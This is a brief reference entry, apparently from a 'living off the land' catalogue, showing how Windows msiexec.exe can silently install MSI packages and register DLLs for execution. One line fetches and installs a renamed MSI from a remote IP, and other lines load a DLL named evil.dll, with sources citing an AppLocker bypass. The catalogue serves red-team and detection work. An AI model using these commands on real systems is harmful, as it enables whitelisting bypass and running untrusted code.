## Msiexec.exe
* Functions: Execute
```

msiexec /quiet /i cmd.msi
Installs the target .MSI file silently.

msiexec /q /i http://192.168.100.3/tmp/cmd.png
Installs the target remote & renamed .MSI file silently.

msiexec /y "C:\folder\evil.dll"
Calls DLLRegisterServer to register the target DLL.

msiexec /z "C:\folder\evil.dll"
Calls DLLRegisterServer to un-register the target DLL.
```
   
* Resources:   
  * https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/
  * https://twitter.com/PhilipTsukerman/status/992021361106268161
   
* Full path:   
  * c:\windows\system32\msiexec.exe
  * c:\windows\sysWOW64\msiexec.exe
   
* Notes: Thanks to ? - @netbiosX, PhilipTsukerman - @PhilipTsukerman  
   
